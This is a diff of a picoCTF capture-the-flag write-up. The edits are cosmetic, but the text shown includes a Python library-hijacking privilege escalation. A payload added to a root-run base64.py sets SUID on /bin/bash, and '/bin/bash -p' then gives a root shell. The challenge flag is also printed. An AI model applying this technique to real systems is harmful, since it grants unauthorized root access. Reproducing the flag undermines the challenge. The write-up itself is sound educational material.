@@ -1,4 +1,4 @@
-<h2>chrono Gneral Skills -- 100 points</h2>
+<h2>chrono General Skills -- 100 points</h2>
 
 ![image](https://user-images.githubusercontent.com/67879936/226687719-42b2846c-c3fc-41d5-81fd-2ba56610a025.png)
 
@@ -1888,7 +1888,8 @@ Found it, this script runs as root. Since we have write privileges over it this 
 
 We'll be adding this payload to the top of the ```base64.py``` file
 
-```import os
+```
+import os
 
 os.system('chmod +s /bin/bash')
 ```
@@ -1905,7 +1906,7 @@ Running the command ```/bin/bash -p``` should get you a root shell
 
 ![image](https://user-images.githubusercontent.com/67879936/227750634-2010e341-121d-4b31-a5b2-8c3ec33d8eb2.png)
 
-cool, we got our flag :sunglasses
+cool, we got our flag😎
 
 FLAG:- ```picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}```
 
